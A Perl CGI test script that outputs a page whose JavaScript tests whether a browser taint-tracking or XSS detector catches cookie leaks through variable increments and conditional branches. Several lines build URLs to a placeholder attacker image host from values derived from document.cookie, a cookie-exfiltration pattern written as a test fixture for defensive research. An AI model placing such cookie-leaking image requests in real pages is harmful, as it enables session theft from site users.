#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_INCVAR";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = 4;
		var url = "$imgevilurl?normal=";
		function testfunc() {
			var b = 3;
			++b;
			url = url + b;
		}
		testfunc();
		document.images[0].src = url;
		
		// if with evil val 
		var notevil2 = { test : 4};
		url = "$imgevilurl?if=";
		function testfunc2() {
			var b = 3;
			if ($evil) {
				++b;
			}
			url = url + b;
		}
		testfunc2();
		document.images[1].src = url;
		
		// normal usage 
		var notevil3 = 3;
		url = "$imgevilurl?isevil=";
		if ($evil) {
			notevil3 = 4;
		}
		function testfunc3() {
			var b = notevil3;
			++b;
			url = url + b;
		}
		testfunc3();
		document.images[2].src = url;
		
    </script>
|;

require "xss_basic_footer.pl";
